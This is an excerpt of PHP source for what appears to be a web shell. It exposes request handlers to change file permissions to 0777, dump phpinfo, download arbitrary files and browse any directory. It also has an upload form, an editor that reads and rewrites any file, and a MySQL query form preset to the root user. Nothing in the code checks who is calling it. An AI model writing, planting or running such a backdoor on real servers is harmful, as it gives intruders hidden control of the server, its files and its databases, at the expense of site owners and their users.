...
if (isset($_REQUEST['chm'])) {
    echo (chmod($_REQUEST['chm'], 0777) ? "Reassigned" : "Can't Reassign");
} elseif (isset($_REQUEST['phpinfo'])) {
    phpinfo();
} elseif (isset($_REQUEST['dl'])) {
    $file = $_REQUEST['dl'] . $_REQUEST['file'];
    ...
    if (is_dir($d)) {
        ...
        echo " (<a href='?d=" . urlencode(cleanPath($d, $isLinux)) . "&uploadForm=1'>upload file</a>) (<a href='?d=" . urlencode(cleanPath($d, $isLinux)) . "&hldb=1'>DB interaction files in red</a>)</h2>";
    ...
    echo "This feature has been disabled for security reasons.";
    ...
    if (isset($_FILES["file_name"])) {
        ...
        <form enctype="multipart/form-data" action="" method="post">
            Upload file:<input name="file_name" type="file"> <input type="submit" value="Upload"/>
        </form>
    ...
    <form action="" name="f" method="POST">
        <textarea wrap="off" rows="40" cols="130"
                  name="newcontent"><?php echo file_get_contents($_REQUEST['ef']) ?></textarea><br/>
        <input type="submit" value="I base64 encoded it myself, don't run script"/>
        <br/>
        <input type="submit" value="Change (requires javascript to work)"
               onclick="document.f.newcontent.value=encode64(document.f.newcontent.value);"/>
    </form>
    <?php
} else {
    ?>
    ...
    <b>Go to any directory:</b> <form action="" method="GET"><input type="text" name="d"
                                                                     value="<?php echo $rootDir ?>"/><input
    ...
    <form action="" METHOD="GET">
        <table>
            ...
            <tr>
                <td>user</td>
                <td><input type="text" name="usr" value="root"> </td>
            </tr>
            <tr>
                <td>password</td>
            ...
            <tr>
                ...
                <td><textarea name="mquery" rows="6" cols="65"></textarea> </td>
            </tr>
            <tr>
